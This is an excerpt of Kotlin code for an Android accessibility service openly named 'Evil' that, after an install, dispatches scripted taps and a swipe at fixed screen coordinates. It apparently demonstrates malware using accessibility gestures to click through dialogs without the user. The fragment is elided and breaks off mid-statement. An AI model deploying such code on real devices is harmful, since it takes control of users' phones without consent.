...
class EvilAccessibilityService : AccessibilityService() {
    ...
    inner class DoneInstallingCallback : AccessibilityService.GestureResultCallback() {
        override fun onCompleted(gestureDescription: GestureDescription?) {
            ...
            val builder = GestureDescription.Builder()
            val path0 = Path()
            path0.moveTo(780.0f, 1027.0f)
            val stroke0 = GestureDescription.StrokeDescription(path0, 3000, 100)
            builder.addStroke(stroke0)
            val path1 = Path()
            path1.moveTo(841.0f, 1850.0f)
            val stroke1 = GestureDescription.StrokeDescription(path1, 5000, 100)
            builder.addStroke(stroke1)
            val path2 = Path()
            path2.moveTo(500.0f, 500.0f)
            path2.lineTo(500.0f, 1500.0f)
            val stroke2 = GestureDescription.StrokeDescription(path2, 7000, 500)
            builder.addStroke(stroke2)
            val path3 = Path()
            path3.moveTo(940.0f, 145.0f)
            val stroke3 = GestureDescription.StrokeDescription(path3, 9000, 100)
